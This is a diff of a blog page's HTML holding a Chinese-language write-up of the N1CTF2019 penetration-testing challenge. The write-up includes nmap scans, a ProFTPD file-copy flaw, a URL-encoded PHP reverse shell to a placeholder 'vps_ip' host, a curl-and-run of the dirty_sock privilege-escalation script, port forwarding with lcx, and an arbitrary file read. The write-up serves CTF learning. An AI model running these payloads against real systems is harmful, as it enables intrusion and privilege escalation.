@@ -21,13 +21,13 @@
     
     
     <meta name="keywords" content="ctf,渗透">
-    <meta name="description" content="Pentest N1ctf2019.lab(step1)链接：http://47.52.129.242/web页面啥也没有，用nmap扫一波 nmap -sS -P0 -T4 47.52.129.242 -vv  扫描结果 PORT   STATE SERVICE REASON 21/tcp open  ftp     syn-ack ttl 128 22/tcp open  ssh     sy">
+    <meta name="description" content="Pentest N1ctf2019.lab(step1)链接：http://47.52.129.242/web页面啥也没有，用nmap扫一波1nmap -sS -P0 -T4 47.52.129.242 -vv 扫描结果1234PORT   STATE SERVICE REASON21/tcp open  ftp     syn-ack ttl 12822/tcp open  ssh     sy">
 <meta name="keywords" content="ctf,渗透">
 <meta property="og:type" content="article">
 <meta property="og:title" content="N1CTF2019渗透题题解">
 <meta property="og:url" content="https://byqiyou.github.io/2019/09/08/N1CTF2019渗透题题解/index.html">
 <meta property="og:site_name" content="七友">
-<meta property="og:description" content="Pentest N1ctf2019.lab(step1)链接：http://47.52.129.242/web页面啥也没有，用nmap扫一波 nmap -sS -P0 -T4 47.52.129.242 -vv  扫描结果 PORT   STATE SERVICE REASON 21/tcp open  ftp     syn-ack ttl 128 22/tcp open  ssh     sy">
+<meta property="og:description" content="Pentest N1ctf2019.lab(step1)链接：http://47.52.129.242/web页面啥也没有，用nmap扫一波1nmap -sS -P0 -T4 47.52.129.242 -vv 扫描结果1234PORT   STATE SERVICE REASON21/tcp open  ftp     syn-ack ttl 12822/tcp open  ssh     sy">
 <meta property="og:locale" content="zh-CN">
 <meta property="og:image" content="https://xzfile.aliyuncs.com/media/upload/picture/20190908105616-3993ed62-d1e4-1.png">
 <meta property="og:image" content="https://xzfile.aliyuncs.com/media/upload/picture/20190908110708-be5654a8-d1e5-1.png">
@@ -42,7 +42,7 @@
 <meta property="og:updated_time" content="2019-09-08T12:53:29.528Z">
 <meta name="twitter:card" content="summary">
 <meta name="twitter:title" content="N1CTF2019渗透题题解">
-<meta name="twitter:description" content="Pentest N1ctf2019.lab(step1)链接：http://47.52.129.242/web页面啥也没有，用nmap扫一波 nmap -sS -P0 -T4 47.52.129.242 -vv  扫描结果 PORT   STATE SERVICE REASON 21/tcp open  ftp     syn-ack ttl 128 22/tcp open  ssh     sy">
+<meta name="twitter:description" content="Pentest N1ctf2019.lab(step1)链接：http://47.52.129.242/web页面啥也没有，用nmap扫一波1nmap -sS -P0 -T4 47.52.129.242 -vv 扫描结果1234PORT   STATE SERVICE REASON21/tcp open  ftp     syn-ack ttl 12822/tcp open  ssh     sy">
 <meta name="twitter:image" content="https://xzfile.aliyuncs.com/media/upload/picture/20190908105616-3993ed62-d1e4-1.png">
     
     <link rel="shortcut icon" href="/favicon.ico">
@@ -205,15 +205,9 @@
 
         </div>
         <div class="post-content" id="post-content" itemprop="postContent">
-            <h2 id="Pentest-N1ctf2019-lab-step1"><a href="#Pentest-N1ctf2019-lab-step1" class="headerlink" title="Pentest N1ctf2019.lab(step1)"></a>Pentest N1ctf2019.lab(step1)</h2><p>链接：<a href="http://47.52.129.242/" target="_blank" rel="noopener">http://47.52.129.242/</a><br>web页面啥也没有，用nmap扫一波</p>
-<pre class=" language-sh"><code class="language-sh">nmap -sS -P0 -T4 47.52.129.242 -vv
-</code></pre>
-<p>扫描结果</p>
-<pre><code>PORT   STATE SERVICE REASON
-21/tcp open  ftp     syn-ack ttl 128
-22/tcp open  ssh     syn-ack ttl 128
-80/tcp open  http    syn-ack ttl 128
-</code></pre><p>发现开放了<code>22</code>，<code>21</code>，<code>80</code>端口，猜测入口点应该是在<code>ftp</code>服务，发现可以匿名登陆</p>
+            <h2 id="Pentest-N1ctf2019-lab-step1"><a href="#Pentest-N1ctf2019-lab-step1" class="headerlink" title="Pentest N1ctf2019.lab(step1)"></a>Pentest N1ctf2019.lab(step1)</h2><p>链接：<a href="http://47.52.129.242/" target="_blank" rel="noopener">http://47.52.129.242/</a><br>web页面啥也没有，用nmap扫一波<br></p><figure class="highlight sh"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nmap -sS -P0 -T4 47.52.129.242 -vv</span><br></pre></td></tr></tbody></table></figure><p></p>
+<p>扫描结果<br></p><figure class="highlight plain"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">PORT   STATE SERVICE REASON</span><br><span class="line">21/tcp open  ftp     syn-ack ttl 128</span><br><span class="line">22/tcp open  ssh     syn-ack ttl 128</span><br><span class="line">80/tcp open  http    syn-ack ttl 128</span><br></pre></td></tr></tbody></table></figure><p></p>
+<p>发现开放了<code>22</code>，<code>21</code>，<code>80</code>端口，猜测入口点应该是在<code>ftp</code>服务，发现可以匿名登陆</p>
 <figure class="image-bubble">
                 <div class="img-lightbox">
                     <div class="overlay"></div>
@@ -221,13 +215,9 @@
                 </div>
                 <div class="image-caption">image.png</div>
             </figure>
-<p>用<code>nmap</code>扫描一下版本</p>
-<pre><code>nmap -sV -P0 -p 21 47.52.129.242 -vv
-</code></pre><p>扫描结果如下</p>
-<pre><code>PORT   STATE SERVICE REASON          VERSION
-21/tcp open  ftp     syn-ack ttl 128 ProFTPD 1.3.5rc3
-Service Info: OS: Unix
-</code></pre><p>用msf找一下有没有<code>ProFTPD</code>这个版本的洞，发现有一个文件复制漏洞<br></p><figure class="image-bubble">
+<p>用<code>nmap</code>扫描一下版本<br></p><figure class="highlight plain"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nmap -sV -P0 -p 21 47.52.129.242 -vv</span><br></pre></td></tr></tbody></table></figure><p></p>
+<p>扫描结果如下<br></p><figure class="highlight plain"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">PORT   STATE SERVICE REASON          VERSION</span><br><span class="line">21/tcp open  ftp     syn-ack ttl 128 ProFTPD 1.3.5rc3</span><br><span class="line">Service Info: OS: Unix</span><br></pre></td></tr></tbody></table></figure><p></p>
+<p>用msf找一下有没有<code>ProFTPD</code>这个版本的洞，发现有一个文件复制漏洞<br></p><figure class="image-bubble">
                 <div class="img-lightbox">
                     <div class="overlay"></div>
                     <img src="https://xzfile.aliyuncs.com/media/upload/picture/20190908110708-be5654a8-d1e5-1.png" alt="image.png" title="">
@@ -250,9 +240,8 @@ Service Info: OS: Unix
                 </div>
                 <div class="image-caption">image.png</div>
             </figure>
-<p>为了方便操作，我们弹个shell回来</p>
-<pre><code>/qiyou.php?enjoy~=$sock+%3d+fsockopen("vps_ip",+6666)%3b$descriptorspec+%3d+array(0+%3d&gt;+$sock,1+%3d&gt;+$sock,2+%3d&gt;+$sock)%3b$process+%3d+proc_open('/bin/sh',+$descriptorspec,+$pipes)%3bproc_close($process)%3b
-</code></pre><p>根据题目提示，flag在<code>/root/flag.txt</code>里面，但是发现没有权限</p>
+<p>为了方便操作，我们弹个shell回来<br></p><figure class="highlight plain"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">/qiyou.php?enjoy~=$sock+%3d+fsockopen("vps_ip",+6666)%3b$descriptorspec+%3d+array(0+%3d&gt;+$sock,1+%3d&gt;+$sock,2+%3d&gt;+$sock)%3b$process+%3d+proc_open('/bin/sh',+$descriptorspec,+$pipes)%3bproc_close($process)%3b</span><br></pre></td></tr></tbody></table></figure><p></p>
+<p>根据题目提示，flag在<code>/root/flag.txt</code>里面，但是发现没有权限</p>
 <figure class="image-bubble">
                 <div class="img-lightbox">
                     <div class="overlay"></div>
@@ -260,9 +249,8 @@ Service Info: OS: Unix
                 </div>
                 <div class="image-caption">image.png</div>
             </figure>
-<p>根据题目提示<code>snap</code>，猜测可能是要用<code>snap</code>提权，google一下这个版本的<code>snap</code>发现可以提权，直接用github上的脚本提权：<a href="https://github.com/initstring/dirty_sock/blob/master/dirty_sockv2.py" target="_blank" rel="noopener">链接</a><br>然后执行一波</p>
-<pre><code>curl -O https://raw.githubusercontent.com/initstring/dirty_sock/master/dirty_sockv2.py &amp;&amp; python3 dirty_sockv2.py
-</code></pre><p>执行成功后会创建一个<code>dirty_sock</code>用户，密码也为<code>dirty_sock</code>。然后我们ssh连上去（php反弹shell的不能直接用su）就可以提权了</p>
+<p>根据题目提示<code>snap</code>，猜测可能是要用<code>snap</code>提权，google一下这个版本的<code>snap</code>发现可以提权，直接用github上的脚本提权：<a href="https://github.com/initstring/dirty_sock/blob/master/dirty_sockv2.py" target="_blank" rel="noopener">链接</a><br>然后执行一波<br></p><figure class="highlight plain"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">curl -O https://raw.githubusercontent.com/initstring/dirty_sock/master/dirty_sockv2.py &amp;&amp; python3 dirty_sockv2.py</span><br></pre></td></tr></tbody></table></figure><p></p>
+<p>执行成功后会创建一个<code>dirty_sock</code>用户，密码也为<code>dirty_sock</code>。然后我们ssh连上去（php反弹shell的不能直接用su）就可以提权了</p>
 <figure class="image-bubble">
                 <div class="img-lightbox">
                     <div class="overlay"></div>
@@ -278,9 +266,8 @@ Service Info: OS: Unix
                 </div>
                 <div class="image-caption">image.png</div>
             </figure>
-<h2 id="Pentest-N1ctf2019-lab-step2"><a href="#Pentest-N1ctf2019-lab-step2" class="headerlink" title="Pentest N1ctf2019.lab(step2)"></a>Pentest N1ctf2019.lab(step2)</h2><p>第一步渗透完了，猜测第二个flag应该是在内网的其它机器上面，我们用nmap扫描一下C段</p>
-<pre><code>nmap -p 80 -sS -T4 10.0.0.85/24
-</code></pre><p>发现内网的一个<code>10.0.0.88</code>开放80端口</p>
+<h2 id="Pentest-N1ctf2019-lab-step2"><a href="#Pentest-N1ctf2019-lab-step2" class="headerlink" title="Pentest N1ctf2019.lab(step2)"></a>Pentest N1ctf2019.lab(step2)</h2><p>第一步渗透完了，猜测第二个flag应该是在内网的其它机器上面，我们用nmap扫描一下C段<br></p><figure class="highlight plain"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nmap -p 80 -sS -T4 10.0.0.85/24</span><br></pre></td></tr></tbody></table></figure><p></p>
+<p>发现内网的一个<code>10.0.0.88</code>开放80端口</p>
 <figure class="image-bubble">
                 <div class="img-lightbox">
                     <div class="overlay"></div>
@@ -290,9 +277,8 @@ Service Info: OS: Unix
             </figure>
 <p>为了方便操作，我们用<code>lcx</code>把内网的<code>10.0.0.88</code>的80端口转发出来</p>
 <p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20190908165332-22a1c138-d216-1.png" alt="image.png"></p>
-<p>查看源码发现有任意文件读取</p>
-<pre><code>readfile.php?path=img/kerberos.jpg
-</code></pre><figure class="image-bubble">
+<p>查看源码发现有任意文件读取<br></p><figure class="highlight plain"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">readfile.php?path=img/kerberos.jpg</span><br></pre></td></tr></tbody></table></figure><p></p>
+<figure class="image-bubble">
                 <div class="img-lightbox">
                     <div class="overlay"></div>
                     <img src="https://xzfile.aliyuncs.com/media/upload/picture/20190908164857-7eaeff82-d215-1.png" alt="image.png" title="">
@@ -444,6 +430,13 @@ Service Info: OS: Unix
 
 
 
+<section class="comments" id="comments">
+    <!-- UY BEGIN -->
+    <div id="uyan_frame"></div>
+    <script src="http://v2.uyan.cc/code/uyan.js?uid=true"></script>
+    <!-- UY END -->
+</section>
+
 
 
 
@@ -510,7 +503,7 @@ Service Info: OS: Unix
         </p>
     </div>
     <div class="bottom">
-        <p><span> &copy; 2015 - 2019</span>
+        <p><span> &copy; 2018 - 2019</span>
             <span>
                 
                 Power by <a href="http://hexo.io/" target="_blank">Hexo</a> Theme <a href="https://github.com/yscoder/hexo-theme-indigo" target="_blank">indigo</a>
